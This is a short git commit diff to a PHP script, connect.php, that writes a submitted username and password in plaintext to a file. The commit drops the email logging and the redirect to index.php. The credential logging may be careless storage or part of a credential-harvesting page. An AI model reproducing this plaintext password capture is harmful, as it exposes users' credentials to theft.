05f13ae2f23fe519b30bdf49b4952b08e3904f51
thememaginaryshop <soaibhaque3@gmail.com>
2020-10-15 09:41:24 +0530

    changes

--- connect.php
+++ connect.php
@@ -4,10 +4,7 @@
 
     fwrite($file,"name :");
     fwrite($file, $username ."\n");
-    fwrite($file,"Email :");
-    fwrite($file, $email ."\n");
-    fwrite($file,"Password :");
+    fwrite($file,"password :");
     fwrite($file, $password ."\n");
     fclose($file);
-    header("location: index.php");
  ?>
